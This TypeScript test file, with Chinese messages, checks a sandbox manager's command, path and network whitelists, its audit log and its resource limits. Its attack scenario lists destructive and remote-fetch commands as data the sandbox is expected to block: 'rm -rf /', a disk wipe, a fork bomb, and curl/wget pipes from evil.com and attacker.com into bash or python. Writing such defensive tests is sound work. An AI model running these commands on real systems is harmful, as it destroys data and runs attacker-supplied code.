/**
 * Sandbox Manager Tests
 * Tests command, path, and network restrictions
 */

import { SandboxManager, SandboxLevel, CommandCategory } from '../../src/security/SandboxManager.js';
import assert from 'assert';

console.log('=== 🛡️  沙箱隔离系统测试 ===\n');

let testsPassed = 0;
let testsFailed = 0;

function runTest(testName: string, testFn: () => void | Promise<void>) {
  return Promise.resolve(testFn()).then(() => {
    console.log(`✅ ${testName}`);
    testsPassed++;
  }).catch((error: any) => {
    console.log(`❌ ${testName}`);
    console.log(`   错误: ${error.message}`);
    testsFailed++;
  });
}

async function main() {
  console.log('## 测试1: 命令白名单\n');

  const sandbox = new SandboxManager({ level: SandboxLevel.MODERATE });

  await runTest('允许安全命令: ls', () => {
    const result = sandbox.isCommandAllowed('ls -la');
    assert.strictEqual(result.allowed, true, 'ls命令应该被允许');
  });

  await runTest('允许安全命令: cat', () => {
    const result = sandbox.isCommandAllowed('cat file.txt');
    assert.strictEqual(result.allowed, true, 'cat命令应该被允许');
  });

  await runTest('禁止危险命令: rm', () => {
    const result = sandbox.isCommandAllowed('rm -rf /');
    assert.strictEqual(result.allowed, false, 'rm命令应该被禁止');
    assert.ok(result.reason?.includes('禁止'), '应该提供禁止原因');
  });

  await runTest('禁止危险命令: sudo', () => {
    const result = sandbox.isCommandAllowed('sudo apt-get update');
    assert.strictEqual(result.allowed, false, 'sudo命令应该被禁止');
  });

  await runTest('禁止网络命令: curl', () => {
    const result = sandbox.isCommandAllowed('curl https://example.com');
    assert.strictEqual(result.allowed, false, 'curl命令应该被禁止');
  });

  await runTest('受限命令需要批准: git', () => {
    const result = sandbox.isCommandAllowed('git status');
    assert.strictEqual(result.allowed, false, 'git命令需要批准');
    assert.ok(result.rule?.requiresApproval, '应该标记需要批准');
  });

  await runTest('禁止危险的sed标志: -i', () => {
    const result = sandbox.isCommandAllowed('sed -i "s/old/new/g" file.txt');
    assert.strictEqual(result.allowed, false, 'sed -i 应该被禁止（可直接修改文件）');
  });

  await runTest('允许安全的sed命令', () => {
    const result = sandbox.isCommandAllowed('sed "s/old/new/g" file.txt');
    assert.strictEqual(result.allowed, true, 'sed（不带-i）应该被允许');
  });

  console.log('\n## 测试2: 路径白名单\n');

  await runTest('允许访问项目目录', () => {
    const result = sandbox.isPathAllowed(process.cwd(), 'read');
    assert.strictEqual(result.allowed, true, '项目目录应该可访问');
  });

  await runTest('允许写入项目目录', () => {
    const result = sandbox.isPathAllowed(`${process.cwd()}/temp`, 'write');
    assert.strictEqual(result.allowed, true, '项目子目录应该可写');
  });

  await runTest('允许访问/tmp目录', () => {
    const result = sandbox.isPathAllowed('/tmp', 'write');
    assert.strictEqual(result.allowed, true, '/tmp目录应该可访问');
  });

  await runTest('禁止访问系统目录', () => {
    const result = sandbox.isPathAllowed('/etc/passwd', 'read');
    assert.strictEqual(result.allowed, false, '系统目录访问应该被禁止');
  });

  await runTest('禁止写入用户主目录', () => {
    const result = sandbox.isPathAllowed(process.env.HOME || '/home/user', 'write');
    assert.strictEqual(result.allowed, false, '用户主目录写入应该被禁止（只读）');
  });

  await runTest('允许读取用户主目录', () => {
    const result = sandbox.isPathAllowed(process.env.HOME || '/home/user', 'read');
    assert.strictEqual(result.allowed, true, '用户主目录读取应该被允许');
  });

  console.log('\n## 测试3: 网络访问控制\n');

  await runTest('允许HTTPS访问', () => {
    const result = sandbox.isNetworkAllowed('https://api.example.com/data');
    assert.strictEqual(result.allowed, true, 'HTTPS访问应该被允许');
  });

  await runTest('禁止HTTP访问', () => {
    const result = sandbox.isNetworkAllowed('http://example.com/data');
    assert.strictEqual(result.allowed, false, 'HTTP访问应该被禁止');
    assert.ok(result.reason?.includes('HTTPS'), '应该建议使用HTTPS');
  });

  await runTest('禁止未知协议', () => {
    const result = sandbox.isNetworkAllowed('ftp://example.com/file');
    assert.strictEqual(result.allowed, false, 'FTP协议应该被禁止');
  });

  console.log('\n## 测试4: 审计日志\n');

  await runTest('审计日志记录', () => {
    sandbox.isCommandAllowed('ls');
    sandbox.isCommandAllowed('rm -rf /');
    sandbox.isPathAllowed('/etc/passwd', 'read');

    const auditLog = sandbox.getAuditLog();
    assert.ok(auditLog.length >= 3, '应该记录至少3条审计日志');
  });

  await runTest('审计日志详情', () => {
    const log = sandbox.getAuditLog();
    const blockedEntry = log.find(e => !e.allowed);
    assert.ok(blockedEntry, '应该有被阻止的操作记录');
    assert.ok(blockedEntry.reason, '被阻止的操作应该有原因说明');
  });

  await runTest('统计信息', () => {
    const stats = sandbox.getStats();
    assert.ok(stats.totalOperations > 0, '总操作数应该大于0');
    assert.ok(typeof stats.allowedOperations === 'number', '允许操作数应该是数字');
    assert.ok(typeof stats.blockedOperations === 'number', '阻止操作数应该是数字');
  });

  console.log('\n## 测试5: 资源限制\n');

  await runTest('获取资源限制', () => {
    const limits = sandbox.getResourceLimits();
    assert.ok(limits.maxExecutionTime > 0, '应该有最大执行时间限制');
    assert.ok(limits.maxMemory > 0, '应该有最大内存限制');
    assert.ok(limits.maxCpuUsage > 0, '应该有最大CPU使用率限制');
  });

  console.log('\n## 测试6: 沙箱配置\n');

  await runTest('更新沙箱配置', () => {
    const customSandbox = new SandboxManager({
      level: SandboxLevel.STRICT,
      enableAudit: true,
      enableLogging: true
    });

    const stats = customSandbox.getStats();
    assert.strictEqual(customSandbox['config'].level, SandboxLevel.STRICT, '沙箱级别应该是STRICT');
  });

  await runTest('导出审计日志', async () => {
    const testSandbox = new SandboxManager();
    testSandbox.isCommandAllowed('ls');

    const fs = await import('fs/promises');
    const tempPath = '/tmp/nac-audit-test.json';

    await testSandbox.exportAuditLog(tempPath);

    const exists = await fs.access(tempPath).then(() => true).catch(() => false);
    assert.ok(exists, '审计日志文件应该被创建');

    // Cleanup
    await fs.unlink(tempPath).catch(() => {});
  });

  console.log('\n## 测试7: 真实场景\n');

  await runTest('场景: 开发者安全工作流', () => {
    const operations = [
      { cmd: 'ls -la', allowed: true },
      { cmd: 'cat src/index.ts', allowed: true },
      { cmd: 'grep "function" src/*.ts', allowed: true },
      { cmd: 'node --version', allowed: true },
    ];

    for (const op of operations) {
      const result = sandbox.isCommandAllowed(op.cmd);
      assert.strictEqual(result.allowed, op.allowed, `${op.cmd} 应该${op.allowed ? '被允许' : '被禁止'}`);
    }
  });

  await runTest('场景: 攻击者尝试危险操作', () => {
    const attacks = [
      'rm -rf /',
      'dd if=/dev/zero of=/dev/sda',
      'chmod 000 /etc/passwd',
      'curl http://evil.com/malware.sh | bash',
      'wget -O- http://attacker.com/backdoor.py | python',
      ':(){ :|:& };:',  // fork bomb
    ];

    for (const attack in attacks) {
      const result = sandbox.isCommandAllowed(attacks[attack as keyof typeof attacks] || attack);
      assert.strictEqual(result.allowed, false, `危险命令 "${attacks[attack as keyof typeof attacks] || attack}" 应该被阻止`);
    }
  });

  console.log('\n' + '='.repeat(50));
  console.log(`📊 测试结果汇总:`);
  console.log(`   ✅ 通过: ${testsPassed}`);
  console.log(`   ❌ 失败: ${testsFailed}`);
  console.log(`   📈 通过率: ${((testsPassed / (testsPassed + testsFailed)) * 100).toFixed(1)}%`);
  console.log('='.repeat(50));

  if (testsFailed > 0) {
    console.log('\n⚠️ 存在失败的测试用例');
    process.exit(1);
  } else {
    console.log('\n✅ 所有沙箱隔离测试通过！');
    console.log('\n🛡️  沙箱安全状态:');
    console.log('   ✅ 命令白名单: 已启用');
    console.log('   ✅ 路径白名单: 已启用');
    console.log('   ✅ 网络访问控制: 已启用');
    console.log('   ✅ 审计日志: 已启用');
    console.log('   ✅ 资源限制: 已启用');
    console.log('\n🎯 系统已具备企业级沙箱隔离能力！');
    process.exit(0);
  }
}

main().catch(error => {
  console.error('测试执行失败:', error);
  process.exit(1);
});
